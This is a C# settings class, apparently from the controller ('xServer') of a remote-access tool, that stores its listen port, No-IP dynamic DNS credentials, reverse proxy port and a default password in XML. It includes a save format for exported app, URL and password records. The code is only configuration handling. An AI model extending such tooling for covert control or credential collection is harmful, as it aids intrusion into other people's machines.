using System.IO;
using System.Windows.Forms;
using System.Xml;
using System.Xml.XPath;

namespace xServer.KuuhakuCekirdek.Veri
{
    public static class Ayarlar
    {
        private static readonly string SettingsPath = Path.Combine(Application.StartupPath, "ayarlar.xml" +
                                                                                            "");
        public static string HelpURL = @"https://www.facebook.com/okan.ugur.5076";

        public static ushort ListenPort
        {
            get { return ushort.Parse(ReadValueSafe("PortDinle", "4782")); }
            set { WriteValue("PortDinle", value.ToString()); }
        }

        public static bool ShowToU
        {
            get
            {
                return bool.Parse(ReadValueSafe("ShowToU", "True"));
            }
            set
            {
                WriteValue("ShowToU", value.ToString());
            }
        }

        public static bool AutoListen
        {
            get { return bool.Parse(ReadValueSafe("OtomatikDinle", "False")); }
            set { WriteValue("OtomatikDinle", value.ToString()); }
        }

        public static bool ShowPopup
        {
            get { return bool.Parse(ReadValueSafe("PopupGöster", "False")); }
            set { WriteValue("PopupGöster", value.ToString()); }
        }

        public static bool UseUPnP
        {
            get { return bool.Parse(ReadValueSafe("UPnPKullan", "False")); }
            set { WriteValue("UPnPKullan", value.ToString()); }
        }

        public static bool ShowToolTip
        {
            get { return bool.Parse(ReadValueSafe("ToolTipGöster", "False")); }
            set { WriteValue("ToolTipGöster", value.ToString()); }
        }

        public static string Password
        {
            get { return ReadValueSafe("Password", "1234"); }
            set { WriteValue("Password", value); }
        }

        public static bool EnableNoIPUpdater
        {
            get { return bool.Parse(ReadValueSafe("EnableNoIPUpdater", "False")); }
            set { WriteValue("EnableNoIPUpdater", value.ToString()); }
        }

        public static string NoIPHost
        {
            get { return ReadValueSafe("NoIPHost"); }
            set { WriteValue("NoIPHost", value); }
        }

        public static string NoIPUsername
        {
            get { return ReadValueSafe("NoIPUsername"); }
            set { WriteValue("NoIPUsername", value); }
        }

        public static string NoIPPassword
        {
            get { return ReadValueSafe("NoIPPassword"); }
            set { WriteValue("NoIPPassword", value); }
        }

        public static string SaveFormat
        {
            get { return ReadValueSafe("SaveFormat", "APP - URL - ID:ŞİFRE"); }
            set { WriteValue("SaveFormat", value); }
        }

        public static ushort ReverseProxyPort
        {
            get { return ushort.Parse(ReadValueSafe("ReverseProxyPort", "3128")); }
            set { WriteValue("ReverseProxyPort", value.ToString()); }
        }

        private static string ReadValue(string pstrValueToRead)
        {
            try
            {
                XPathDocument doc = new XPathDocument(SettingsPath);
                XPathNavigator nav = doc.CreateNavigator();
                XPathExpression expr = nav.Compile(@"/settings/" + pstrValueToRead);
                XPathNodeIterator iterator = nav.Select(expr);
                while (iterator.MoveNext())
                {
                    return iterator.Current.Value;
                }

                return string.Empty;
            }
            catch
            {
                return string.Empty;
            }
        }

        private static string ReadValueSafe(string pstrValueToRead, string defaultValue = "")
        {
            string value = ReadValue(pstrValueToRead);
            return (!string.IsNullOrEmpty(value)) ? value : defaultValue;
        }

        private static void WriteValue(string pstrValueToRead, string pstrValueToWrite)
        {
            try
            {
                XmlDocument doc = new XmlDocument();

                if (File.Exists(SettingsPath))
                {
                    using (var reader = new XmlTextReader(SettingsPath))
                    {
                        doc.Load(reader);
                    }
                }
                else
                {
                    var dir = Path.GetDirectoryName(SettingsPath);
                    if (!Directory.Exists(dir))
                    {
                        Directory.CreateDirectory(dir);
                    }
                    doc.AppendChild(doc.CreateElement("settings"));
                }

                XmlElement root = doc.DocumentElement;
                XmlNode oldNode = root.SelectSingleNode(@"/settings/" + pstrValueToRead);
                if (oldNode == null)
                {
                    oldNode = doc.SelectSingleNode("settings");
                    oldNode.AppendChild(doc.CreateElement(pstrValueToRead)).InnerText = pstrValueToWrite;
                    doc.Save(SettingsPath);
                    return;
                }
                oldNode.InnerText = pstrValueToWrite;
                doc.Save(SettingsPath);
            }
            catch
            {
            }
        }
    }
}